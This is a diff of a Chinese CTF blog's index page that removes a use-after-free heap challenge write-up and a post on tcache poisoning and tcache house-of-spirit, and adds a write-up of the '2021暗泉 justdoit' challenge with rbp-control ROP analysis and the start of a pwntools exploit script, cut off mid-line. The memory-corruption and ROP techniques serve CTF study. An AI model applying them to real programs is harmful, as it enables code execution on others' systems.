@@ -186,7 +186,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-30 21:40:15" itemprop="dateModified" datetime="2022-04-30T21:40:15+08:00">2022-04-30</time>
+                <time title="修改时间：2022-05-03 17:43:25" itemprop="dateModified" datetime="2022-05-03T17:43:25+08:00">2022-05-03</time>
               </span>
 
           
@@ -237,33 +237,6 @@
 <li><p>tcache虽然是单向链表，但是会将bk指针指向bin头，并且会<strong>通过这个指针来查找其所指向的整个bin链表中</strong>有无和这个bk指针所属的chunk相同的chunk，简单点说就是一个加强版的double free检查。绕过也很简单，只需要修改这个bk指针即可。</p>
 </li>
 </ol>
-<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>main函数如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2. delete&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;3. edit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;4. show&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">      v3 = get_num();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">666</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_15C9();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">666</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          edit();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          <span class="keyword">delete</span>();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;oho! BadChoice!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因为复现过程中没有用到sub_15C9()函数所以省略。add函数如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (num &amp; <span class="number">0xFFFFFFF0</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BadIndex!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size?&quot;</span>);</span><br><span class="line">  v2 = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">96</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BadSize!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  qword_4060[num] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  dword_40E0[num] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>delete函数如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (num &amp; <span class="number">0xFFFFFFF0</span>) != <span class="number">0</span> || !qword_4060[num] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Errrrrrrrrrrror!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(qword_4060[num]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因为没有销毁指针，所以存在uaf漏洞</p>
-<p>edit函数如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (num &amp; <span class="number">0xFFFFFFF0</span>) != <span class="number">0</span> || !qword_4060[num] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BadIndex!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content?&quot;</span>);</span><br><span class="line">  ((&amp;sub_1248 + <span class="number">1</span>))(); <span class="comment">//这里似乎有花指令影响了反汇编，但是不重要，直到该函数的功能是编辑块就行了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>show函数如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (num &amp; <span class="number">0xFFFFFFF0</span>) != <span class="number">0</span> || !*(&amp;qword_4060 + num) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BadIndex!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(&amp;qword_4060 + num));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>题目漏洞很简单，因为free掉堆块之后没有进行指针的销毁，所以存在uaf漏洞，而且edit函数可以通过指针直接修改堆块中的内容，所以可以直接在bins上伪造堆块，从而实现任意地址写，然后劫持<code>__free_hook</code>或者<code>__malloc_hook</code>即可</p>
-<p>此题我们要泄漏libc的话就需要将chunk free到unsorted bin中，而因为add函数中允许我们申请的堆块最大大小为0x60，属于fast bins的范围，所以我们需要先通过伪造chunk来实现任意地址写的方式来修改某个chunk的size在unsorted bin范围中，所以我们还需要先泄漏堆地址。</p>
-<p>综上，这题的思路就很明确了：</p>
-<ol>
-<li>泄漏heap地址</li>
-<li>修改某个chunk的size，使该chunk free掉之后进入unsorted bin</li>
-<li>泄漏libc</li>
-<li>劫持<code>__free_hook</code>或者<code>__malloc_hook</code></li>
-</ol>
-<h4 id="libc-2-27下的复现"><a href="#libc-2-27下的复现" class="headerlink" title="libc-2.27下的复现"></a>libc-2.27下的复现</h4><p>2.27版本中存在tcache</p>
-<h5 id="泄漏heap地址"><a href="#泄漏heap地址" class="headerlink" title="泄漏heap地址"></a>泄漏heap地址</h5><p>因为show函数的存在，</p>
 <h3 id="Roc826s-Note"><a href="#Roc826s-Note" class="headerlink" title="Roc826s_Note"></a>Roc826s_Note</h3><p>版本libc-2.23</p>
 <p>还是菜单堆题，主要涉及函数如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.dele&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.show&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -479,78 +452,6 @@
 <h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h4><p>该攻击实现的是任意地址分配chunk。</p>
 <p>主要有三个要求：① 伪造的假块需要一个字长对齐。② 目标地址-1字长处需要设置fast bin范围内的size。③ 需要设置目标地址chunk的下一个chunk的size，但是这个size只需要合理即可，不一定要是fast bin范围内的</p>
 <p>首先覆写一个指针指向一个我们伪造的fastbin假块，然后完成相应size的设置（该chunk的size，下一个chunk的size）之后直接free掉这个指针就完成了任意地址分配。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/16/%E5%A0%86%E5%88%A9%E7%94%A8-tcache/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/16/%E5%A0%86%E5%88%A9%E7%94%A8-tcache/" class="post-title-link" itemprop="url">堆利用-tcache</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-16 15:52:03 / 修改时间：16:33:55" itemprop="dateCreated datePublished" datetime="2022-04-16T15:52:03+08:00">2022-04-16</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="Tcache-相关"><a href="#Tcache-相关" class="headerlink" title="Tcache 相关"></a>Tcache 相关</h4><p>lifanxin师傅的博客，写的很细<a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115442780">CTF pwn题堆入门 – Tcache bin___lifanxin的博客-CSDN博客</a></p>
-<blockquote>
-<p>tcache相对于其余四种bin，是出现的最晚的，在libc2-26中才加入，但现在的题目一般都基于更新版本的libc，tcache肯定是必不可少的一环，而且是最开始的那一环，所以这里先对tcache机制进行一个总结。<br>  Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块。无须对arena上锁既可以使用，所以采用这种机制后分配算法有不错的性能提升。每个线程默认使用64个单链表结构的bins，<strong>每个bins最多存放7个chunk</strong>，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache bin中。对于每个tcache bin单链表，它和fast bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache bin中的chunk不会被合并，即使和Top chunk相邻。<br>  另外tcache机制出现后，每次产生堆都会先产生一个0x250大小的堆块，该堆块位于堆的开头，用于记录64个bins的地址（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache bin链的数量，从0x20开始到0x410结束，刚好64条链，然后剩下的每8字节记录一条tcache bin链的开头地址，也是从0x20开始到0x410结束。还有一点值得注意的是，<strong>tcache bin中的fd指针是指向malloc返回的地址，也就是用户数据部分，而不是像fast bin单链表那样fd指针指向chunk头。</strong></p>
-</blockquote>
-<h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>how2heap中glibc-2.27的实验之一</p>
-<p>源码不贴了，程序运行如下（默认64位、glibc-2.27）（为了让地址高亮，代码块用了c语言格式）：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">This file demonstrates a simple tcache poisoning attack by tricking <span class="built_in">malloc</span> into</span></span><br><span class="line"><span class="function">returning a pointer to an arbitrary <span class="title">location</span> <span class="params">(in <span class="keyword">this</span> <span class="keyword">case</span>, the <span class="built_in">stack</span>)</span>.</span></span><br><span class="line"><span class="function">The attack is very similar to fastbin corruption attack.</span></span><br><span class="line"><span class="function">After the patch https:<span class="comment">//sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span></span></span><br><span class="line"><span class="function">We have to create <span class="keyword">and</span> <span class="built_in">free</span> one more chunk <span class="keyword">for</span> padding before fd pointer hijacking.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">The address we want <span class="title">malloc</span><span class="params">()</span> to <span class="keyword">return</span> is 0x7fffe93daa68.</span></span><br><span class="line"><span class="function">Allocating 2 buffers.</span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">128</span>)</span>: 0x855260</span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">128</span>)</span>: 0x8552f0</span></span><br><span class="line"><span class="function">Freeing the buffers...</span></span><br><span class="line"><span class="function">Now the tcache <span class="built_in">list</span> has [ 0x8552f0 -&gt; 0x855260 ].</span></span><br><span class="line"><span class="function">We overwrite the first 8 <span class="title">bytes</span> <span class="params">(fd/next pointer)</span> of the data at 0x8552f0</span></span><br><span class="line"><span class="function">to point to the location to <span class="title">control</span> <span class="params">(<span class="number">0x7fffe93daa68</span>)</span>.</span></span><br><span class="line"><span class="function">Now the tcache <span class="built_in">list</span> has [ 0x8552f0 -&gt; 0x7fffe93daa68 ].</span></span><br><span class="line"><span class="function">1st <span class="title">malloc</span><span class="params">(<span class="number">128</span>)</span>: 0x8552f0</span></span><br><span class="line"><span class="function">Now the tcache <span class="built_in">list</span> has [ 0x7fffe93daa68 ].</span></span><br><span class="line"><span class="function">2nd <span class="title">malloc</span><span class="params">(<span class="number">128</span>)</span>: 0x7fffe93daa68</span></span><br><span class="line"><span class="function">We got the control</span></span><br></pre></td></tr></table></figure>
-
-<p>利用方式很简单，通过覆写tcache bin中的chunk的fd指针使其指向栈上（或者说我们的目标地址），然后再malloc一个跟这个tcache bin相同大小的chunk，那么就会在目标地址中得到一个chunk</p>
-<p>需要注意的是因为tcache bin中的fd指针指向chunk的数据区，所以malloc之后得到的指针跟我们所修改的值是一样的，这一点跟fast bin有所区别。</p>
-<h4 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h4><p>程序运行如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates the house of spirit attack on tcache.</span><br><span class="line">It works in a similar way to original house of spirit but you don<span class="number">&#x27;</span>t need to create fake chunk after the fake chunk that will be freed.</span><br><span class="line">You can see <span class="keyword">this</span> in <span class="built_in">malloc</span>.c in function _int_free that tcache_put is called without checking <span class="keyword">if</span> next chunk<span class="number">&#x27;</span>s size <span class="keyword">and</span> prev_inuse are sane.</span><br><span class="line">(Search <span class="keyword">for</span> strings <span class="string">&quot;invalid next size&quot;</span> <span class="keyword">and</span> <span class="string">&quot;double free or corruption&quot;</span>)</span><br><span class="line"></span><br><span class="line">Ok. Let<span class="number">&#x27;</span>s start with the example!.</span><br><span class="line"></span><br><span class="line"><span class="function">Calling <span class="title">malloc</span><span class="params">()</span> once so that it sets up its memory.</span></span><br><span class="line"><span class="function">Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span></span><br><span class="line"><span class="function">This region contains one fake chunk. It&#x27;s size field is placed at 0x7ffef3b9d598</span></span><br><span class="line"><span class="function">This chunk size has to be falling into the tcache <span class="title">category</span> <span class="params">(chunk.size &lt;= <span class="number">0x410</span>; <span class="built_in">malloc</span> arg &lt;= <span class="number">0x408</span> on x64)</span>. The <span class="title">PREV_INUSE</span> <span class="params">(lsb)</span> bit is ignored by <span class="built_in">free</span> <span class="keyword">for</span> tcache chunks, however the <span class="title">IS_MMAPPED</span> <span class="params">(second lsb)</span> <span class="keyword">and</span> <span class="title">NON_MAIN_ARENA</span> <span class="params">(third lsb)</span> bits cause problems.</span></span><br><span class="line"><span class="function">... note that <span class="keyword">this</span> has to be the size of the next <span class="built_in">malloc</span> request rounded to the internal size used by the <span class="built_in">malloc</span> implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="keyword">for</span> the <span class="built_in">malloc</span> parameter at the end. </span></span><br><span class="line"><span class="function">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffef3b9d598.</span></span><br><span class="line"><span class="function">... note that the memory address of the *region* associated with <span class="keyword">this</span> chunk must be 16-byte aligned.</span></span><br><span class="line"><span class="function">Freeing the overwritten pointer.</span></span><br><span class="line"><span class="function">Now the next <span class="built_in">malloc</span> will <span class="keyword">return</span> the region of our fake chunk at 0x7ffef3b9d598, which will be 0x7ffef3b9d5a0!</span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0x30</span>)</span>: 0x7ffef3b9d5a0</span></span><br></pre></td></tr></table></figure>
-
-<p>这个实验首先让一个指针指向一个伪造的假chunk（通过覆写或者某种方式），同时需要在这个指针-1字长的位置伪造正确的chunk_size大小，且这个大小必须在 0x20—0x410 之间（64位下tcache bin所存储的chunk大小），然后去free掉这个指针，最后malloc出来就在目标地址得到了一个chunk。</p>
 
       
     </div>
@@ -1307,6 +1208,101 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/" class="post-title-link" itemprop="url">2021暗泉-justdoit</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-23 23:38:37" itemprop="dateCreated datePublished" datetime="2022-02-23T23:38:37+08:00">2022-02-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-24 00:25:18" itemprop="dateModified" datetime="2022-02-24T00:25:18+08:00">2022-02-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>首先看看题目，main函数如下</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/main.png" class>
+
+<p>read_long() 函数如下</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/read_long.jpg" class>
+
+<p>题目给的两处输入都没有溢出，但仔细观察main函数的汇编会发现有这个</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-1.jpg" class>
+
+<p>因为read_long()函数中用到了 atol() 函数将我们的输入的字符串转化为整型，且这个函数的返回值就是转化后的整型值，显然 read_long() 函数加上红线汇编就起到让我们任意控制 rbp 的值，间接让我们控制了返回地址。同时因为main函数中的局部变量 buf[32] 并没有被初始化，我们就可以利用第一个输入在栈上布置返回地址，但是其只允许我们输入 0x18 个字节，也就是最多一次布置3条返回地址，但是因为我们首先需要泄漏libc，所以我们需要多次返回main函数完成ROP的布置以及泄漏，需要布置如下ROP：</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-2.jpg" class>
+
+<p>那么我们第一次如下输入</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-3.jpg" class>
+
+<p>然后将 rbp 拉到 rsp 的位置</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-4.png" class>
+
+<p>leave_ret之后</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-5.png" class>
+
+<p>再次执行到main函数的第一个read时的栈</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-6.png" class>
+
+<p>由此完成泄漏ROP的布置</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-7.jpg" class>
+
+<p>其实这部分很简单，简单分析下函数调用就完了，再往后getshell部分重复即可</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011D5</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x04012b3</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x4011D5&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span 